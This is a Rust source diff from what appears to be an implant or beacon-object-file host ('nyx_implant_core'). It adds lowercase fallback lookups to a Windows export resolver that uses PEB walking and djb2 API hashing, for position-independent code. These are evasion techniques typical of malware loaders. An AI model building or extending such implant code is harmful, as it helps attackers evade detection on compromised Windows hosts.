@@ -116,9 +116,30 @@ fn exit_process(code: u32) -> ! {
 ///
 /// All bof-host lookups route through this (the crate files import
 /// `crate::export_addr`), keeping the call sites unchanged.
+/// Lowercase a short ASCII name onto a stack buffer (no allocation).
+fn ascii_lower(name: &[u8]) -> ([u8; 32], usize) {
+    let mut buf = [0u8; 32];
+    let n = name.len().min(31);
+    for i in 0..n {
+        let b = name[i];
+        buf[i] = if b.is_ascii_uppercase() { b + 32 } else { b };
+    }
+    (buf, n)
+}
+
 pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
+    // Try the exact name, then lowercase — Windows ntdll stores export
+    // names lowercase (resolve.rs notes it), wine keeps them CamelCase, so
+    // both are needed for cross-environment resolution.
     if let Some(a) = nyx_implant_core::resolve::export_addr(module, func) {
         return Some(a);
+    }
+    let (lower_buf, lower_len) = ascii_lower(func);
+    let lower = &lower_buf[..lower_len];
+    if lower != func {
+        if let Some(a) = nyx_implant_core::resolve::export_addr(module, lower) {
+            return Some(a);
+        }
     }
     // Diagnostic: PEB-walk path failed.
     stamp_diag(0xC4);
@@ -140,14 +161,22 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         stamp_diag(0xC5);
         return None;
     }
-    let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
+    if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
         base as *mut u8,
         nyx_implant_core::resolve::djb2(func),
-    );
-    if r.is_none() {
-        stamp_diag(0xC6);
+    ) {
+        return Some(r);
     }
-    r
+    if lower != func {
+        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+            base as *mut u8,
+            nyx_implant_core::resolve::djb2(lower),
+        ) {
+            return Some(r);
+        }
+    }
+    stamp_diag(0xC6);
+    None
 }
 
 /// PIC entry point — blob offset 0 after extraction. `packed` (rcx) points at
